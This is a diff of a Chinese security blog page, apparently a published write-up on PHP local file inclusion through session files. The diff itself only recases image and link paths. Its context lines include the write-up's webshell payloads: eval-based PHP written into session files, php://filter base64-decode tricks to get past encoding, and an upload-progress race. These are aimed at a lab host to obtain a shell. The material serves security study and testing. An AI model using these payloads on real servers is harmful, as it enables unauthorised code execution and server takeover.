@@ -414,7 +414,7 @@
 <h1 id="用户会话"><a href="#用户会话" class="headerlink" title="用户会话"></a>用户会话</h1><p>在了解session包含文件漏洞及绕过姿势的时候，我们应该首先了解一下服务器上针对用户会话session的存储与处理是什么过程，只有了解了其存储和使用机制我们才能够合理的去利用它得到我们想要的结果。</p>
 <h2 id="会话存储"><a href="#会话存储" class="headerlink" title="会话存储"></a>会话存储</h2><h3 id="存储方式"><a href="#存储方式" class="headerlink" title="存储方式"></a>存储方式</h3><p><code>Java</code>是将用户的session存入内存中，而<code>PHP</code>则是将session以文件的形式存储在服务器某个文件中，可以在<code>php.ini</code>里面设置session的存储位置<code>session.save_path</code>。</p>
 <p>可以通过phpinfo查看<code>session.save_path</code>的值</p>
-<p><img src="/2020/03/12/lfi-bypass-session-restriction-getshell/1594459-20200303212941086-1409773850.png" alt></p>
+<p><img src="/2020/03/12/LFI-Bypass-Session-Restriction-Getshell/1594459-20200303212941086-1409773850.png" alt></p>
 <p>知道session的存储后，总结常见的php-session默认存放位置是很有必要的，因为在很多时候服务器都是按照默认设置来运行的，这个时候假如我们发现了一个没有安全措施的session包含漏洞就可以尝试利用默认的会话存放路径去包含利用。</p>
 <ul>
 <li><strong>默认路径</strong></li>
@@ -424,7 +424,7 @@
 /tmp/sess_PHPSESSID
 /tmp/sessions/sess_PHPSESSID</code></pre><h3 id="命名格式"><a href="#命名格式" class="headerlink" title="命名格式"></a>命名格式</h3><p>如果某个服务器存在session包含漏洞，要想去成功的包含利用的话，首先必须要知道的是服务器是如何存放该文件的，只要知道了其命名格式我们才能够正确的去包含该文件。</p>
 <p><code>session</code>的文件名格式为<code>sess_[phpsessid]</code>。而phpsessid在发送的请求的cookie字段中可以看到。</p>
-<p><img src="/2020/03/12/lfi-bypass-session-restriction-getshell/1594459-20200303213850030-1657765691.png" alt></p>
+<p><img src="/2020/03/12/LFI-Bypass-Session-Restriction-Getshell/1594459-20200303213850030-1657765691.png" alt></p>
 <h2 id="会话处理"><a href="#会话处理" class="headerlink" title="会话处理"></a>会话处理</h2><p>在了解了用户会话的存储下来就需要了解php是如何处理用户的会话信息。php中针对用户会话的处理方式主要取决于服务器在php.ini或代码中对<code>session.serialize_handler</code>的配置。</p>
 <h3 id="session-serialize-handler"><a href="#session-serialize-handler" class="headerlink" title="session.serialize_handler"></a>session.serialize_handler</h3><p>PHP中处理用户会话信息的主要是下面定义的两种方式</p>
 <pre><code>session.serialize_handler = php           一直都在(默认方式)  它是用 |分割
@@ -440,7 +440,7 @@ session.serialize_handler = php_serialize  php5.5之后启用 它是用serialize
     <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
 
 <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2020/03/12/lfi-bypass-session-restriction-getshell/1594459-20200313103511228-1370068133.png" alt></p>
+<p><img src="/2020/03/12/LFI-Bypass-Session-Restriction-Getshell/1594459-20200313103511228-1370068133.png" alt></p>
 <p>从图中可以看到默认<code>session.serialize_handler=php</code>处理模式只对用户名的内容进行了序列化存储，没有对变量名进行序列化，可以看作是服务器对用户会话信息的半序列化存储过程。</p>
 <h3 id="session-serialize-handler-php-serialize"><a href="#session-serialize-handler-php-serialize" class="headerlink" title="session.serialize_handler=php_serialize"></a>session.serialize_handler=php_serialize</h3><p>php5.5之后启用这种处理模式，它是用serialize反序列化格式进行存储用户的会话信息。一样的通过一个简单的用户会话过程了解<code>session.serialize_handler=php_serialize</code>是如何工作的。这种模式可以在php.ini或者代码中进行设置。</p>
 <p><code>session.php</code></p>
@@ -452,7 +452,7 @@ session.serialize_handler = php_serialize  php5.5之后启用 它是用serialize
     <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
 
 <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2020/03/12/lfi-bypass-session-restriction-getshell/1594459-20200313104304635-744740298.png" alt></p>
+<p><img src="/2020/03/12/LFI-Bypass-Session-Restriction-Getshell/1594459-20200313104304635-744740298.png" alt></p>
 <p>从图中可以看到<code>session.serialize_handler=php_serialize</code>处理模式，对整个session信息包括文件名、文件内容都进行了序列化处理，可以看作是服务器对用户会话信息的完全序列化存储过程。</p>
 <p>对比上面<code>session.serialize_handler</code>的两种处理模式，可以看到他们在session处理上的差异，既然有差异我们就要合理的去利用这两种处理模式，假如编写代码不规范的时候处理session同时用了两种模式，那么在攻击者可以利用的情况下，很可能会造成session反序列化漏洞。</p>
 <h1 id="LFI-Session"><a href="#LFI-Session" class="headerlink" title="LFI Session"></a>LFI Session</h1><p>介绍了用户会话的存储和处理机制后，我们就可以去深入的理解session文件包含漏洞。LFI本地文件包含漏洞主要是包含本地服务器上存储的一些文件，例如Session会话文件、日志文件、临时文件等。但是，只有我们能够控制包含的文件存储我们的恶意代码才能拿到服务器权限。</p>
@@ -477,7 +477,7 @@ session.serialize_handler = php_serialize  php5.5之后启用 它是用serialize
 <pre><code>http://192.33.6.145/FI/session/session.php
 
 POST
-username=&lt;?php eval($_REQUEST[Qftm]);?&gt;</code></pre><p><img src="/2020/03/12/lfi-bypass-session-restriction-getshell/1594459-20200318114723865-137375536.png" alt></p>
+username=&lt;?php eval($_REQUEST[Qftm]);?&gt;</code></pre><p><img src="/2020/03/12/LFI-Bypass-Session-Restriction-Getshell/1594459-20200318114723865-137375536.png" alt></p>
 <p>可以看到有会话产生，同时我们也已经写入了我们的恶意代码。</p>
 <p>既然已经写入了恶意代码，下来就要利用文件包含漏洞去包含这个恶意代码，执行我们想要的结果。借助上一步产生的sessionID进行包含利用构造相应的payload。</p>
 <p>payload</p>
@@ -486,7 +486,7 @@ username=&lt;?php eval($_REQUEST[Qftm]);?&gt;</code></pre><p><img src="/2020/03/
 index.php?file=/var/lib/php/sessions/sess_7qefqgu07pluu38m45isiesq3s
 
 POST
-Qftm=system(&#39;whoami&#39;);</code></pre><p><img src="/2020/03/12/lfi-bypass-session-restriction-getshell/1594459-20200318115455933-344072591.png" alt></p>
+Qftm=system(&#39;whoami&#39;);</code></pre><p><img src="/2020/03/12/LFI-Bypass-Session-Restriction-Getshell/1594459-20200318115455933-344072591.png" alt></p>
 <p>从攻击结果可以看到我们的payload和恶意代码确实都已经正常解析和执行。</p>
 <h2 id="包含限制"><a href="#包含限制" class="headerlink" title="包含限制"></a>包含限制</h2><p>在上面我们所介绍的只是一种简单的理想化的漏洞条件，所以你会看到这么简单就利用成功了，但是，事实上在平常我们所遇到的会有很多限制，比如说代码中对用户会话信息做了一定的处理然后才进行存储，这些处理操作常见的包括对用户session信息进行编码或加密等。另外常见的限制比如说服务器代码中没有出现代码<code>session_start();</code>进行会话的初始化操作，这个时候服务器就无法生成用户session文件，攻击者也就没有办法就进行恶意session文件的包含。</p>
 <p>下面主要针对这几种session包含限制，利用系统服务或代码本身的缺陷进行探索与利用。</p>
@@ -509,21 +509,21 @@ Qftm=system(&#39;whoami&#39;);</code></pre><p><img src="/2020/03/12/lfi-bypass-s
 
 <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h2 id="常规利用"><a href="#常规利用" class="headerlink" title="常规利用"></a>常规利用</h2><p>正常情况下我们会先传入恶意代码在服务器上存储恶意session文件</p>
-<p><img src="/2020/03/12/lfi-bypass-session-restriction-getshell/1594459-20200313105212688-1636791267.png" alt></p>
+<p><img src="/2020/03/12/LFI-Bypass-Session-Restriction-Getshell/1594459-20200313105212688-1636791267.png" alt></p>
 <p>然后在利用文件包含漏洞去包含session</p>
-<p><img src="/2020/03/12/lfi-bypass-session-restriction-getshell/1594459-20200313105430753-945888114.png" alt></p>
+<p><img src="/2020/03/12/LFI-Bypass-Session-Restriction-Getshell/1594459-20200313105430753-945888114.png" alt></p>
 <p>从包含结果可以看到我们包含的session被编码了，导致<code>LFI -&gt; session</code>失败。</p>
 <p>在不知道源代码的情况下，从编码上看可以判断是base64编码处理的</p>
-<p><img src="/2020/03/12/lfi-bypass-session-restriction-getshell/1594459-20200313105938071-325060230.png" alt></p>
+<p><img src="/2020/03/12/LFI-Bypass-Session-Restriction-Getshell/1594459-20200313105938071-325060230.png" alt></p>
 <p>在这里可以用逆向思维想一下，他既然对我们传入的session进行了base64编码，那么我们是不是只要对其进行base64解码然后再包含不就可以了，这个时候<code>php://filter</code>就可以利用上了。</p>
 <p>构造payload</p>
-<pre><code>index.php?file=php://filter/convert.base64-decode/resource=/var/lib/php/sessions/sess_qfg3alueqlubqu59l822krh5pl</code></pre><p><img src="/2020/03/12/lfi-bypass-session-restriction-getshell/1594459-20200313110552453-1553940744.png" alt></p>
+<pre><code>index.php?file=php://filter/convert.base64-decode/resource=/var/lib/php/sessions/sess_qfg3alueqlubqu59l822krh5pl</code></pre><p><img src="/2020/03/12/LFI-Bypass-Session-Restriction-Getshell/1594459-20200313110552453-1553940744.png" alt></p>
 <p>意外的事情发生了，你发现解码后包含的内容竟然是乱码！！这是为什么呢？？</p>
 <h2 id="Bypass-serialize-handler-php"><a href="#Bypass-serialize-handler-php" class="headerlink" title="Bypass serialize_handler=php"></a>Bypass serialize_handler=php</h2><p>对于上面利用<code>php://filter</code>的base64解码功能进行解码包含出现了错误，还是不能够利用成功，回过头仔细想想会发现，session存储的一部分信息是用户名base64编码后的信息，然而我们对session进行base64解码的是整个session信息，也就是说编码和解码的因果关系不对，也就导致解码的结果是乱码。</p>
 <p>那有没有什么办法可以让base64编码和解码的因果关系对照上，答案是有的，先来了解一下base64编码与解码的原理。</p>
 <h3 id="Base64编码与解码"><a href="#Base64编码与解码" class="headerlink" title="Base64编码与解码"></a>Base64编码与解码</h3><p>Base64编码是使用64个可打印ASCII字符（A-Z、a-z、0-9、+、/）将任意字节序列数据编码成ASCII字符串，另有“=”符号用作后缀用途。</p>
 <h4 id="base64索引表"><a href="#base64索引表" class="headerlink" title="base64索引表"></a>base64索引表</h4><p>base64编码与解码的基础索引表如下</p>
-<p><img src="/2020/03/12/lfi-bypass-session-restriction-getshell/1594459-20200313112718558-1619373709.png" alt></p>
+<p><img src="/2020/03/12/LFI-Bypass-Session-Restriction-Getshell/1594459-20200313112718558-1619373709.png" alt></p>
 <h4 id="base64编码原理"><a href="#base64编码原理" class="headerlink" title="base64编码原理"></a>base64编码原理</h4><p><strong>（1）base64编码过程</strong></p>
 <p>Base64将输入字符串按字节切分，取得每个字节对应的二进制值（若不足8比特则高位补0），然后将这些二进制数值串联起来，再按照6比特一组进行切分（因为2^6=64），最后一组若不足6比特则末尾补0。将每组二进制值转换成十进制，然后在上述表格中找到对应的符号并串联起来就是Base64编码结果。</p>
 <p>由于二进制数据是按照8比特一组进行传输，因此Base64按照6比特一组切分的二进制数据必须是24比特的倍数（6和8的最小公倍数）。24比特就是3个字节，若原字节序列数据长度不是3的倍数时且剩下1个输入数据，则在编码结果后加2个=；若剩下2个输入数据，则在编码结果后加1个=。</p>
@@ -538,7 +538,7 @@ Qftm=system(&#39;whoami&#39;);</code></pre><p><img src="/2020/03/12/lfi-bypass-s
 4）将每组6位的二进制转为十进制；
 
 5）从Base64编码表获取十进制对应的Base64编码；</code></pre><p>下面举例对字符串<code>“ABCD”</code>进行base64编码：</p>
-<p><img src="/2020/03/12/lfi-bypass-session-restriction-getshell/1594459-20200313113245221-2144338235.png" alt></p>
+<p><img src="/2020/03/12/LFI-Bypass-Session-Restriction-Getshell/1594459-20200313113245221-2144338235.png" alt></p>
 <p>对于不足6位的补零（图中浅红色的4位），索引为“A”；对于最后不足3字节，进行补零处理（图中红色部分），以“=”替代，因此，“ABCD”的base64编码为：“QUJDRA==”。</p>
 <h4 id="base64解码原理"><a href="#base64解码原理" class="headerlink" title="base64解码原理"></a>base64解码原理</h4><p><strong>（1）base64解码过程</strong></p>
 <p>base64解码，即是base64编码的逆过程，如果理解了编码过程，解码过程也就容易理解。将base64编码数据根据编码表分别索引到编码值，然后每4个编码值一组组成一个24位的数据流，解码为3个字符。对于末尾位“=”的base64数据，最终取得的4字节数据，需要去掉“=”再进行转换。</p>
@@ -572,7 +572,7 @@ Qftm=system(&#39;whoami&#39;);</code></pre><p><img src="/2020/03/12/lfi-bypass-s
 <ul>
 <li>运行结果</li>
 </ul>
-<p><img src="/2020/03/12/lfi-bypass-session-restriction-getshell/1594459-20200317092914997-1376619696.png" alt></p>
+<p><img src="/2020/03/12/LFI-Bypass-Session-Restriction-Getshell/1594459-20200317092914997-1376619696.png" alt></p>
 <p>从结果中可以看到一个字符串中，不管出现多少个特殊字符或者位置上的差异，都不会影响最终的结果，可以验证base64_decode是遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p>
 <h3 id="Bypass-base64-encode"><a href="#Bypass-base64-encode" class="headerlink" title="Bypass base64_encode"></a>Bypass base64_encode</h3><p>了解了base64编码原理之后和解码的特点，怎么让base64解码和编码的因果关系对照上，其实就很简单了，我们只要让session文件中base64编码的前面这一部分<code>username|s:40:&quot;</code>正常解码就可以，怎么才能正常解码呢，需要满足base64解码的原理，就是4个字节能够还原原始的3个字节信息，也就是说session前面的这部分数据长度需要满足4的整数倍，如果不满足的话，就会影响session后面真正的base64编码的信息，也就导致上面出现的乱码情况。</p>
 <h4 id="Bypass分析判断"><a href="#Bypass分析判断" class="headerlink" title="Bypass分析判断"></a>Bypass分析判断</h4><p>正常情况下base64解码包含<code>serialize_handler=php</code>处理过的原始session信息，未能正常解析执行</p>
@@ -596,24 +596,24 @@ user name s111  //base64解码特点，去除特殊字符，填充0个字节&#39
 <pre><code>POST：
 username=qftmqftmqftmqftmqftmqftmqftmqftmqftmqftmqftmqftm&lt;?php eval($_POST[&#39;mtfq&#39;]);?&gt;</code></pre><p>先测试payload编码后的长度是否满足构造需求</p>
 <p>base64编码</p>
-<pre><code>cWZ0bXFmdG1xZnRtcWZ0bXFmdG1xZnRtcWZ0bXFmdG1xZnRtcWZ0bXFmdG1xZnRtPD9waHAgZXZhbCgkX1BPU1RbJ210ZnEnXSk7Pz4=</code></pre><p><img src="/2020/03/12/lfi-bypass-session-restriction-getshell/1594459-20200313121223649-58947131.png" alt></p>
+<pre><code>cWZ0bXFmdG1xZnRtcWZ0bXFmdG1xZnRtcWZ0bXFmdG1xZnRtcWZ0bXFmdG1xZnRtPD9waHAgZXZhbCgkX1BPU1RbJ210ZnEnXSk7Pz4=</code></pre><p><img src="/2020/03/12/LFI-Bypass-Session-Restriction-Getshell/1594459-20200313121223649-58947131.png" alt></p>
 <p>编码测长</p>
-<p><img src="/2020/03/12/lfi-bypass-session-restriction-getshell/1594459-20200313121356731-1397855559.png" alt></p>
+<p><img src="/2020/03/12/LFI-Bypass-Session-Restriction-Getshell/1594459-20200313121356731-1397855559.png" alt></p>
 <p>结果中可以看到payload满足长度的需求。</p>
 <h4 id="Bypass攻击利用"><a href="#Bypass攻击利用" class="headerlink" title="Bypass攻击利用"></a>Bypass攻击利用</h4><p>分析怎么绕过之后，可以构造payload传入恶意session</p>
 <pre><code>http://192.33.6.145/FI/session/session.php
 
 POST：
-username=qftmqftmqftmqftmqftmqftmqftmqftmqftmqftmqftmqftm&lt;?php eval($_POST[&#39;mtfq&#39;]);?&gt;</code></pre><p><img src="/2020/03/12/lfi-bypass-session-restriction-getshell/1594459-20200313121822051-1296620878.png" alt></p>
+username=qftmqftmqftmqftmqftmqftmqftmqftmqftmqftmqftmqftm&lt;?php eval($_POST[&#39;mtfq&#39;]);?&gt;</code></pre><p><img src="/2020/03/12/LFI-Bypass-Session-Restriction-Getshell/1594459-20200313121822051-1296620878.png" alt></p>
 <p>然后构造payload包含恶意session</p>
 <pre><code>http://192.33.6.145/FI/index.php?file=php://filter/convert.base64-decode/resource=/var/lib/php/sessions/sess_qfg3alueqlubqu59l822krh5pl
 
 POST：
-mtfq=phpinfo();</code></pre><p><img src="/2020/03/12/lfi-bypass-session-restriction-getshell/1594459-20200313122012864-1978637120.png" alt></p>
+mtfq=phpinfo();</code></pre><p><img src="/2020/03/12/LFI-Bypass-Session-Restriction-Getshell/1594459-20200313122012864-1978637120.png" alt></p>
 <p>从相应结果中可以看到，在PHP默认的会话处理模式<code>serialize_handler=php</code>下，我们这次构造的payload成功解析了，达到了预期的目的。</p>
 <h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><p>尝试蚁剑连接我们session中传入的恶意代码</p>
-<p><img src="/2020/03/12/lfi-bypass-session-restriction-getshell/1594459-20200313122255469-468699212.png" alt></p>
-<p><img src="/2020/03/12/lfi-bypass-session-restriction-getshell/1594459-20200313122353878-877050915.png" alt></p>
+<p><img src="/2020/03/12/LFI-Bypass-Session-Restriction-Getshell/1594459-20200313122255469-468699212.png" alt></p>
+<p><img src="/2020/03/12/LFI-Bypass-Session-Restriction-Getshell/1594459-20200313122353878-877050915.png" alt></p>
 <p>从连接情况上看，后门代码的运行是正常的没有出现问题。</p>
 <h2 id="Bypass-serialize-handler-php-serialize"><a href="#Bypass-serialize-handler-php-serialize" class="headerlink" title="Bypass serialize_handler=php_serialize"></a>Bypass serialize_handler=php_serialize</h2><p>看到这里可能有人会想上面默认处理的是<code>session.serialize_handler = php</code>这种模式，那么针对<code>session.serialize_handler = php_serialize</code>这种处理方式呢，答案是一样的，只要能构造出相应的<code>payload</code>满足恶意代码的正常解码就可以。</p>
 <h3 id="测试代码-2"><a href="#测试代码-2" class="headerlink" title="测试代码"></a>测试代码</h3><p><strong>session.php</strong></p>
@@ -629,7 +629,7 @@ mtfq=phpinfo();</code></pre><p><img src="/2020/03/12/lfi-bypass-session-restrict
 <h3 id="Bypass分析判断-1"><a href="#Bypass分析判断-1" class="headerlink" title="Bypass分析判断"></a>Bypass分析判断</h3><p>正常情况下base64解码包含<code>serialize_handler=php_serialize</code>处理过的原始session信息，未能正常解析执行</p>
 <pre><code>a:1:{s:8:&quot;username&quot;;s:40:&quot;PD9waHAgZXZhbCgkX1BPU1RbJ210ZnEnXSk7Pz4=&quot;;}
 
-?file=php://filter/convert.base64-decode/resource=/var/lib/php/sessions/sess_7qefqgu07pluu38m45isiesq3s</code></pre><p><img src="/2020/03/12/lfi-bypass-session-restriction-getshell/1594459-20200317101833462-2143950751.png" alt></p>
+?file=php://filter/convert.base64-decode/resource=/var/lib/php/sessions/sess_7qefqgu07pluu38m45isiesq3s</code></pre><p><img src="/2020/03/12/LFI-Bypass-Session-Restriction-Getshell/1594459-20200317101833462-2143950751.png" alt></p>
 <p>这中模式下的分析，和上面Bypass分析的手段是一样的，同样依据base64编码和解码的特点进行分析，当session存储的信息中用户名编码后的长度为个位数时，<code>a:1:{s:8:&quot;username&quot;;s:1:&quot;</code>这部分数据长度为25，实际解码为<code>a1s8usernames1</code>，实际长度为14，不满足情况。</p>
 <p>4组解码-&gt;缺少两个字节，后面需占两位（<code>X</code> 代表占位符）</p>
 <pre><code>a:1:{s:8:&quot;username&quot;;s:1:&quot;  //原始未处理信息
@@ -660,14 +660,14 @@ username=qftmqftmqftmqftmqftmqftmqftmqftmqftmqftmqftmqftm&lt;?php eval($_POST[&#
 <pre><code>http://192.33.6.145/FI/session/index.php?file=php://filter/convert.base64-decode/resource=/var/lib/php/sessions/sess_7qefqgu07pluu38m45isiesq3s
 
 POST：
-mtfq=phpinfo();</code></pre><p><img src="/2020/03/12/lfi-bypass-session-restriction-getshell/1594459-20200317101949704-511310304.png" alt></p>
+mtfq=phpinfo();</code></pre><p><img src="/2020/03/12/LFI-Bypass-Session-Restriction-Getshell/1594459-20200317101949704-511310304.png" alt></p>
 <p>从相应结果中可以看到，这种模式下<code>session.serialize_handler = php_serialize</code>，我们构造的payload也成功的解析了，同样达到了预期的目的。</p>
 <h3 id="Getshell-1"><a href="#Getshell-1" class="headerlink" title="Getshell"></a>Getshell</h3><p>尝试蚁剑连接我们session中传入的恶意代码</p>
-<p><img src="/2020/03/12/lfi-bypass-session-restriction-getshell/1594459-20200317102251456-1356737447.png" alt></p>
+<p><img src="/2020/03/12/LFI-Bypass-Session-Restriction-Getshell/1594459-20200317102251456-1356737447.png" alt></p>
 <h1 id="No-session-start"><a href="#No-session-start" class="headerlink" title="No session_start()"></a>No session_start()</h1><h2 id="phpinfo-session"><a href="#phpinfo-session" class="headerlink" title="phpinfo session"></a>phpinfo session</h2><p>一般情况下，<code>session_start()</code>作为会话的开始出现在用户登录等地方以维持会话，但是，如果一个站点存在<code>LFI</code>漏洞，却没有用户会话那么该怎么去包含session信息呢，这个时候我们就要想想系统内部本身有没有什么地方可以直接帮助我们产生session并且一部分数据是用户可控的，很意外的是这种情况存在，下面分析一下怎么去利用。</p>
 <p>想要具体了解session信息就要熟悉session在系统中有哪些配置。默认情况下，<code>session.use_strict_mode</code>值是0，此时用户是可以自己定义<code>Session ID</code>的。比如，我们在Cookie里设置<code>PHPSESSID=Qftm</code>，PHP将会在服务器上创建一个文件：<code>/var/lib/php/sessions/sess_Qftm</code>。</p>
 <p>但这个技巧的实现要满足一个条件：服务器上需要已经初始化Session。 在PHP中，通常初始化Session的操作是执行session_start()。所以我们在审计PHP代码的时候，会在一些公共文件或入口文件里看到上述代码。那么，如果一个网站没有执行这个初始化的操作，是不是就不能在服务器上创建文件了呢？很意外是可以的。下面看一下php.ini里面关键的几个配置项</p>
-<p><img src="/2020/03/12/lfi-bypass-session-restriction-getshell/1594459-20200314154008705-1064981211.png" alt></p>
+<p><img src="/2020/03/12/LFI-Bypass-Session-Restriction-Getshell/1594459-20200314154008705-1064981211.png" alt></p>
 <p><code>session.auto_start</code>：顾名思义，如果开启这个选项，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，也是通常情况下，这个选项都是关闭的。</p>
 <p><code>session.upload_progress.enabled = on</code>：默认开启这个选项，表示<code>upload_progress</code>功能开始，PHP 能够在每一个文件上传时监测上传进度。  这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态。</p>
 <p><code>session.upload_progress.cleanup = on</code>：默认开启这个选项，表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要。</p>
@@ -774,11 +774,11 @@ sessid <span class="token operator">=</span> <span class="token string">'Qftm'</
 <li><strong>运行攻击效果</strong></li>
 </ul>
 <p>在服务器中可以看到生成：sess_Qftm</p>
-<p><img src="/2020/03/12/lfi-bypass-session-restriction-getshell/1594459-20200314192948222-1121155715.png" alt></p>
+<p><img src="/2020/03/12/LFI-Bypass-Session-Restriction-Getshell/1594459-20200314192948222-1121155715.png" alt></p>
 <p>同时恶意代码也会正常执行</p>
-<p><img src="/2020/03/12/lfi-bypass-session-restriction-getshell/1594459-20200314192851582-475034056.png" alt></p>
+<p><img src="/2020/03/12/LFI-Bypass-Session-Restriction-Getshell/1594459-20200314192851582-475034056.png" alt></p>
 <p>之后可以利用后门webshell进行连接Getshell</p>
-<p><img src="/2020/03/12/lfi-bypass-session-restriction-getshell/1594459-20200314193551760-526762313.png" alt></p>
+<p><img src="/2020/03/12/LFI-Bypass-Session-Restriction-Getshell/1594459-20200314193551760-526762313.png" alt></p>
 <h3 id="表单利用攻击"><a href="#表单利用攻击" class="headerlink" title="表单利用攻击"></a>表单利用攻击</h3><p>上面的一种做法是通过编写脚本代码的方式去利用的，不过还有另一种利用手段就是表单的攻击利用。</p>
 <ul>
 <li><strong>表单构造</strong></li>
@@ -801,27 +801,27 @@ sessid <span class="token operator">=</span> <span class="token string">'Qftm'</
 <li><strong>上传文件</strong></li>
 </ul>
 <p>访问本地upload.html开启代理开始上传文件</p>
-<p><img src="/2020/03/12/lfi-bypass-session-restriction-getshell/1594459-20200315113541350-410059347.png" alt></p>
+<p><img src="/2020/03/12/LFI-Bypass-Session-Restriction-Getshell/1594459-20200315113541350-410059347.png" alt></p>
 <ul>
 <li><strong>发包传入恶意会话</strong></li>
 </ul>
 <p>代理拦截我们的上传请求数据包，这里需要设置<code>Cookie: PHPSESSID=123456789</code>（自定义sessionID），然后不断发包，生成session，传入恶意会话。</p>
-<p><img src="/2020/03/12/lfi-bypass-session-restriction-getshell/1594459-20200315114600456-763081719.png" alt></p>
+<p><img src="/2020/03/12/LFI-Bypass-Session-Restriction-Getshell/1594459-20200315114600456-763081719.png" alt></p>
 <p>请求载荷设置<code>Null payloads</code></p>
-<p><img src="/2020/03/12/lfi-bypass-session-restriction-getshell/1594459-20200315114843380-881576851.png" alt></p>
+<p><img src="/2020/03/12/LFI-Bypass-Session-Restriction-Getshell/1594459-20200315114843380-881576851.png" alt></p>
 <p>不断发包维持恶意session的存储</p>
-<p><img src="/2020/03/12/lfi-bypass-session-restriction-getshell/1594459-20200315114940380-862877692.png" alt></p>
+<p><img src="/2020/03/12/LFI-Bypass-Session-Restriction-Getshell/1594459-20200315114940380-862877692.png" alt></p>
 <p>不断发包的情况下，在服务器上可以看到传入的恶意session</p>
-<p><img src="/2020/03/12/lfi-bypass-session-restriction-getshell/1594459-20200315115051499-219732271.png" alt></p>
+<p><img src="/2020/03/12/LFI-Bypass-Session-Restriction-Getshell/1594459-20200315115051499-219732271.png" alt></p>
 <ul>
 <li><strong>发包请求恶意会话</strong></li>
 </ul>
 <p>不断发出请求包含恶意的session</p>
-<p><img src="/2020/03/12/lfi-bypass-session-restriction-getshell/1594459-20200315115423395-603169931.png" alt></p>
+<p><img src="/2020/03/12/LFI-Bypass-Session-Restriction-Getshell/1594459-20200315115423395-603169931.png" alt></p>
 <p>请求载荷设置<code>Null payloads</code></p>
 <p><img src="https://img2020.cnblogs.com/blog/1594459/202003/1594459-20200315114843380-881576851.png" alt></p>
 <p>在一端不断发包维持恶意session存储的时候，另一端不断发包请求包含恶意的session</p>
-<p><img src="/2020/03/12/lfi-bypass-session-restriction-getshell/1594459-20200315115743811-710370741.png" alt></p>
+<p><img src="/2020/03/12/LFI-Bypass-Session-Restriction-Getshell/1594459-20200315115743811-710370741.png" alt></p>
 <p>从结果中可以看到，利用表单攻击的这种手法也是可以的，可以看到恶意代码包含执行成功。</p>
 <h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>在平时遇到限制的时候，多去以逆向的思维和系统服务或代码的本身去考虑问题，这样才很有可能突破固有的限制。</p>
 <pre><code>文章首发于安全客：https://www.anquanke.com/post/id/201177</code></pre>
@@ -849,7 +849,7 @@ sessid <span class="token operator">=</span> <span class="token string">'Qftm'</
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://Qftm.github.io/2020/03/12/lfi-bypass-session-restriction-getshell/">http://Qftm.github.io/2020/03/12/lfi-bypass-session-restriction-getshell/</a>
+                    <a href="http://Qftm.github.io/2020/03/12/LFI-Bypass-Session-Restriction-Getshell/">http://Qftm.github.io/2020/03/12/LFI-Bypass-Session-Restriction-Getshell/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -942,7 +942,7 @@ sessid <span class="token operator">=</span> <span class="token string">'Qftm'</
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/2020/03/15/lfi-phpinfo-or-php7-segment-fault/">
+                <a href="/2020/03/15/LFI-PHPINFO-OR-PHP7-Segment-Fault/">
                     <div class="card-image">
                         
                         
@@ -1000,7 +1000,7 @@ PHP LFIPHP LFI本地文件包含漏洞主要是包含本地服务器上存
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/03/10/linux-electronic-forensics/">
+                <a href="/2020/03/10/Linux-Electronic-Forensics/">
                     <div class="card-image">
                         
                         
